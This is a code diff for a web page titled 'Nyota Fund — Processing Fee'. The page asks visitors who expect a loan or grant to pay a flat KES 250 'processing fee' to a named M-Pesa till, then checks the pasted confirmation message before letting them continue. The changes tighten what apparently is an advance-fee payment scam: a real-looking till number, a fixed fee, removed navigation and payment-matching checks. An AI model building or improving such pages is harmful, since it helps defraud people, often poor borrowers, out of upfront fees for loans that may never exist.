@@ -6,7 +6,18 @@
   <title>Nyota Fund — Processing Fee</title>
   <link rel="stylesheet" href="assets/css/style.css">
 </head>
+
 <body>
+
+<!-- ERROR POPUP (correctly placed inside body) -->
+<div id="errorPopup" class="popup-overlay" style="display:none;">
+  <div class="popup-card">
+    <h3 style="margin:0; color:#b30000;">Verification Failed</h3>
+    <p id="errorText" style="margin:10px 0; font-size:15px;"></p>
+
+    <button id="errorCloseBtn" class="btn-cta" style="background:#b30000;">Close</button>
+  </div>
+</div>
 
 <header class="header">
   <div class="navbar container">
@@ -17,12 +28,6 @@
         <div class="brand-sub">Processing Fee</div>
       </div>
     </div>
-    <nav class="links">
-      <a href="loan-approval-check.html">Approval Check</a>
-      <a href="loan-amount.html">Qualification</a>
-      <a class="active" href="processing-fee.html">Processing Fee</a>
-      <a href="processing-details.html">Processing Details</a>
-    </nav>
   </div>
 </header>
 
@@ -31,7 +36,7 @@
     <h2 style="margin:0">Processing Fee Payment</h2>
 
     <form id="feeForm" style="margin-top:16px">
-      <label>Your Approved Loan Amount (KES)</label>
+      <label>Your Grant Loan Amount (KES)</label>
       <input name="amount" class="input" type="number" required min="1000">
 
       <button class="btn-cta" style="margin-top:12px">Show Processing Fee</button>
@@ -41,7 +46,7 @@
       <!-- Hidden until fee is shown -->
       <div id="mpesaSection" style="display:none; margin-top:20px;">
         <label>Paste Your M-Pesa Confirmation Message</label>
-        <textarea id="mpesaMessage" class="input" rows="4" placeholder="e.g. QJD45H78 Confirmed. Ksh 300.00 paid to ..."></textarea>
+        <textarea id="mpesaMessage" class="input" rows="4" placeholder="e.g. TLADS0NHSC Confirmed. Ksh100.00 paid to COLETS SOLUTIONS ..."></textarea>
 
         <button id="nextBtn" class="btn-cta" style="margin-top:12px;" disabled>Next</button>
       </div>
@@ -56,41 +61,112 @@
 <script>
 document.getElementById("year-fee").textContent = new Date().getFullYear();
 
-const PROCESSING_RATE = 0.03; 
-const TILL_NUMBER = "456789";
+// TILL DETAILS
+const TILL_NUMBER = "5628178";
+const TILL_NAME = "COLETS SOLUTIONS";
+let requiredFee = 250;
 
-document.getElementById("feeForm").addEventListener("submit", e => {
+// Popup handling
+function showErrorPopup(message) {
+  document.getElementById("errorText").textContent = message;
+  document.getElementById("errorPopup").style.display = "flex";
+}
+document.getElementById("errorCloseBtn").onclick = () => {
+  document.getElementById("errorPopup").style.display = "none";
+};
+
+// FORM: Show fee
+document.getElementById("feeForm").addEventListener("submit", (e) => {
   e.preventDefault();
 
   const amount = Number(new FormData(e.target).get("amount"));
-  const fee = amount * PROCESSING_RATE;
+  if (amount < 1000 || amount > 50000) {
+    showErrorPopup("Loan amount must be between KES 1,000 and 50,000.");
+    return;
+  }
+
+  requiredFee = 250;
 
   const output = document.getElementById("feeOutput");
   output.style.color = "green";
   output.innerHTML = `
     <strong>Loan Amount:</strong> KES ${amount.toLocaleString()}<br>
-    <strong>Processing Fee (3%):</strong> KES ${fee.toLocaleString()}<br><br>
-    <strong>Pay the Processing Fee To:</strong><br>
+    <strong>Processing Fee:</strong> 
+    <span style="color:#0A84FF; font-weight:bold;">KES ${requiredFee}</span><br><br>
+
+    <strong>Pay To:</strong><br>
     <span style="font-size:20px; font-weight:bold; color:#0A84FF;">
-      TILL NUMBER: ${TILL_NUMBER}
+      TILL NUMBER: ${TILL_NUMBER}<br>
+      NAME: ${TILL_NAME}
     </span><br><br>
-    After payment, paste your M-Pesa confirmation message below and click "Next".
+
+    After payment, paste your M-Pesa message below.
   `;
 
-  // Show the M-Pesa verification input
   document.getElementById("mpesaSection").style.display = "block";
 });
 
-// Enable Next button only when message is entered
+// User typing — disable Next until validated
 document.getElementById("mpesaMessage").addEventListener("input", () => {
-  const msg = document.getElementById("mpesaMessage").value.trim();
-  document.getElementById("nextBtn").disabled = msg.length < 10;
+  document.getElementById("nextBtn").disabled = true;
 });
 
-// Next button action
-document.getElementById("nextBtn").addEventListener("click", e => {
+// NEXT VALIDATION
+document.getElementById("nextBtn").addEventListener("click", (e) => {
   e.preventDefault();
+
+  const msg = document.getElementById("mpesaMessage").value.trim().toUpperCase();
+
+  // Confirmed
+  if (!msg.includes("CONFIRMED")) {
+    showErrorPopup("Your M-Pesa message must include 'Confirmed'.");
+    return;
+  }
+
+  // Correct Till Name
+  if (!msg.includes(TILL_NAME.toUpperCase())) {
+    showErrorPopup("The message must contain the correct Till Name: " + TILL_NAME);
+    return;
+  }
+
+  // Extract amount paid
+  const amountRegex = /KSH ?(\d+(\.\d+)?)/;
+  const match = msg.match(amountRegex);
+
+  if (!match) {
+    showErrorPopup("Your M-Pesa message is missing the payment amount.");
+    return;
+  }
+
+  const paidAmount = Number(match[1]);
+
+  if (paidAmount !== requiredFee) {
+    showErrorPopup(
+      `The amount paid (Ksh ${paidAmount}) does not match the required fee (Ksh ${requiredFee}).`
+    );
+    return;
+  }
+
+  // Everything is correct → Enable next
   window.location.href = "processing-details.html";
+});
+
+// Enable validation only after typing (live validation)
+document.getElementById("mpesaMessage").addEventListener("input", () => {
+  const msg = document.getElementById("mpesaMessage").value.trim().toUpperCase();
+  const hasConfirmed = msg.includes("CONFIRMED");
+  const hasName = msg.includes(TILL_NAME.toUpperCase());
+  const amountMatch = msg.match(/KSH ?(\d+(\.\d+)?)/);
+
+  if (hasConfirmed && hasName && amountMatch) {
+    const paid = Number(amountMatch[1]);
+    if (paid === requiredFee) {
+      document.getElementById("nextBtn").disabled = false;
+      return;
+    }
+  }
+
+  document.getElementById("nextBtn").disabled = true;
 });
 </script>
 
